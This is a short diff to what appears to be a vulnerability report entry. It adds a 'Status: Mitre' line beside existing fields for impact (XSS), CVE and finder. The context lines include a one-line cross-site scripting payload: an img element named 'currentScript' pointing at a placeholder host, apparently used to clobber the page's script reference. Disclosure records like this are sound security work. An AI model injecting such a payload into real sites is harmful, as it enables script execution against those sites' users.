@@ -9,6 +9,7 @@
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>```
 + Impact: XSS
 + CVE: N/A
++ Status: Mitre
 + Foundby: TheHulk
 
 
